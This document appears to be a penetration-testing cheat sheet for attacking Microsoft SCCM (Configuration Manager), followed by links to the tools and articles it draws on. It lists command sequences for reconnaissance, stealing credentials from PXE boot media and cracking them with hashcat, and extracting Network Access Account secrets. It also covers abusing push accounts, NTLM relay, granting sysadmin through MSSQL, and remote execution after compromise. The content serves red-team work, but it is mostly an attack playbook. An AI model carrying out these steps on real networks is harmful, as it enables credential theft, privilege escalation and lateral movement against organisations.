
# Reconnaissance Commands:

## Windows:
- Control Panel > Configuration Manager
- ADSI search: Get-ADObject -Filter 'ObjectClass -eq "mSSMSManagementPoint"' -Property *
- WMI query: Get-WmiObject -Namespace "root\ccm" -Class SMS_Client
- Sharp SCCM: SharpSCCM.exe local site info

## Linux:
- SCCM Hunter: sccm_hunter.py find
- SCCM Hunter SMB: sccm_hunter.py smb

## Operating System Deployment Exploitation:

### PXE Thief (Windows):
- pxe_thief.py option 1
- pxe_thief.py option 2 -s
- pxe_thief.py option 5 -f
- hashcat -m 19850 
- pxe_thief.py option 3 -f -p
### PXE Thief (Linux):
- pxe_thief.py option 2 -s
- pxe_thief.py option 5 -f
- hashcat -m 19850 
- pxe_thief.py option 3 -f -p
## Network Access Account Exploitation:

### Sharp SCCM:
- SharpSCCM.exe get secrets
- SharpSCCM.exe local secrets -m disk
- SharpSCCM.exe local secret

### Linux (Clement Lavollette's tool):
- sccm_hunter.py get secrets

## Push Account Exploitation:

### Adam Chester's SCCMWTF:
- sccmwtf.py create_machine
- sccmwtf.py change_password -m -p
- sccmwtf.py get naa policy -m -s
### Matt Crill's NTLM Relay:
- ntlmrelayx.py -t http:// -smb2support -c

## SCCM Administrator Privilege Escalation:

### MSSQL Client:
- proxychains mssqlclient.py -windows-auth -no-pass
- USE CM_
- EXEC sp_addsrvrolemember '', 'sysadmin'
- EXEC sp_addrolemember 'ConfigMgr DViewAccess', ''
## Post-Compromise Actions:
- SharpSCCM.exe exec -c -r

# Resources: 

## Tools:
SCCMHunter: https://github.com/garrettfoster13/sccmhunter
pxethief: https://github.com/MWR-CyberSec/**PXEThief
SCCMwtf: https://github.com/xpn/sccmwtf
SharpSCCM: https://github.com/Mayyhem/SharpSCCM
SCCMSecrets: https://github.com/synacktiv/SCCMSecrets
## Articles: 

- https://www.blackhillsinfosec.com/wp-content/uploads/2023/08/SLIDES_SCCM-Exploitation-The-First-Cred-Is-The-Deepest-II-Gabriel-Prudhomme-BHIS.pdf
- Talk: https://www.youtube.com/watch?v=W9PC9erm_pI
- https://www.synacktiv.com/en/publications/sccmsecretspy-exploiting-sccm-policies-distribution-for-credentials-harvesting-initial
- https://www.guidepointsecurity.com/blog/sccm-exploitation-evading-defenses-and-moving-laterally-with-sccm-application-deployment/